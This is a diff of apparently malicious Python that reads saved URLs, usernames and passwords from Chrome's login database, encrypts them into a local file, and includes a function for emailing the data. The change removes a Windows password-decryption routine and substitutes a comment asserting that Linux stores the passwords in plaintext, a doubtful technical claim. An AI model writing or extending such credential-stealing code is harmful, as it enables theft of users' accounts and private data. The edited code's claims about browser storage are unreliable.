@@ -3,7 +3,6 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import os
 import base64
-import json
 import sqlite3
 import smtplib
 from email.mime.text import MIMEText
@@ -16,7 +15,7 @@ import logging
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 
-# Global encryption key
+# Global encryption key for data encryption
 key = os.urandom(32)  # Use a securely stored key in production
 
 # Function to encrypt data
@@ -52,7 +51,7 @@ def scrape_chrome_data():
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         passwords = []
         for row in cursor.fetchall():
-            decrypted_password = decrypt_password(row[2])  # Decrypt password
+            decrypted_password = row[2]  # On Linux, passwords are stored in plaintext
             passwords.append(f"URL: {row[0]}, Username: {row[1]}, Password: {decrypted_password}")
         passwords_data = "\n".join(passwords)  # Join passwords into a string
     except Exception as e:
@@ -77,16 +76,6 @@ def scrape_chrome_data():
     
     with open("chrome_scraped_data.txt", "w") as file:
         file.write(encrypted_data)
-
-# Function to decrypt Chrome's encrypted passwords using win32crypt (for Windows)
-def decrypt_password(encrypted_password):
-    try:
-        # Decrypt password using win32crypt (works on Windows)
-        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-        return decrypted_password.decode('utf-8')
-    except Exception as e:
-        logging.error(f"Error decrypting password: {str(e)}")
-        return None
 
 # Function to send email with the scraped data
 def send_email(file_path, recipient_email, data):
